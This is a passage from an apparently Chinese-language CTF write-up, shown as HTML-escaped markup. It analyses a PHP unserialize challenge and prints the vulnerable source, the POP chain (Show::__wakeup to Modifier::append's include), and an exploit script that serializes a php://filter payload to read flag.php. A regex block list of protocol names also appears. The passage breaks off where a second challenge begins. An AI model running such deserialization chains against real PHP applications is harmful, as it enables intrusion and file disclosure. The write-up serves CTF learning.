class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Welcome to index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//flag is in flag.php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//WTF IS THIS?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//And Crack It!&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Modifier&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt;  &lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;append&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__invoke&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;append&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Show&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$source&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;index.php&amp;#x27;&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source = &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Welcome to &amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source.&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;str-&amp;gt;source;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/gopher|http|file|ftp|https|dict|\.\./i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;source)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;hacker&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source = &lt;span class=&#34;string&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Test&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;p = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__get&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$function&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;pop&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    @&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;pop&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;=&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Show&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;先找出可以 getflag 的点，在 &lt;code&gt;Modifier&lt;/code&gt;  类中 &lt;code&gt;append&lt;/code&gt;  函数有 &lt;code&gt;include&lt;/code&gt;  函数可以文件包含，可以利用， &lt;code&gt;__invoke&lt;/code&gt;  函数直接调用了 &lt;code&gt;append&lt;/code&gt; ，在 Testlei 中 &lt;code&gt;__get&lt;/code&gt;  将 p 作为函数调用，会触发 &lt;code&gt;__invoke&lt;/code&gt; , 在 &lt;code&gt;__totring&lt;/code&gt;  方法中 &lt;code&gt;$this-&amp;gt;str&lt;/code&gt;  赋予 &lt;code&gt;test&lt;/code&gt;  类，在 &lt;code&gt;test&lt;/code&gt;  类读取 &lt;code&gt;source&lt;/code&gt;  变量，（因为 &lt;code&gt;test&lt;/code&gt;  类中没有 &lt;code&gt;source&lt;/code&gt;  属性，则是访问了不可访问的属性）则会自动调用 &lt;code&gt;__get&lt;/code&gt;  魔术方法， &lt;code&gt;__wakeup&lt;/code&gt;  函数将对象进行正则匹配，会触发 &lt;code&gt;__toString&lt;/code&gt; ，而 &lt;code&gt;__wakeup&lt;/code&gt;  在反序列化时会调用，可以当作 pop 链头，而尾时 &lt;code&gt;include&lt;/code&gt;  函数，可以利用 &lt;code&gt;var&lt;/code&gt;  构造 php 为协议获取 flag&lt;/p&gt;
&lt;p&gt;pop 链：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Show:__wakeup -&amp;gt; Show:__toString -&amp;gt; Test:__get -&amp;gt; Modifier:__invoke -&amp;gt;Modifier: append&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Modifier&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$var&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;php://filter/read=convert.base64-encode/resource=flag.php&amp;#x27;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//构造php为协议获取flag&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Show&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$source&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;_construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source=&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Test&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;				 &lt;span class=&#34;comment&#34;&gt;//1.将用到的类写出形成框架并表明类的属性（变量）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;show&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;show&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;test&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$d&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Modifier&lt;/span&gt;(); &lt;span class=&#34;comment&#34;&gt;//将用到的类实例化，用到几次实例化几次&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;-&amp;gt;source=&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;-&amp;gt;str=&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;-&amp;gt;p= &lt;span class=&#34;variable&#34;&gt;$d&lt;/span&gt;;    &lt;span class=&#34;comment&#34;&gt;//根据pop链将对象串联起来&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));  &lt;span class=&#34;comment&#34;&gt;//序列化头并url编码（在这个题中有protected修饰的属性，会有不可见字符）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h5 id=&#34;2021-强网杯-赌徒&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2021-强网杯-赌徒&#34;&gt;#&lt;/a&gt; 2021 强网杯 赌徒&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span 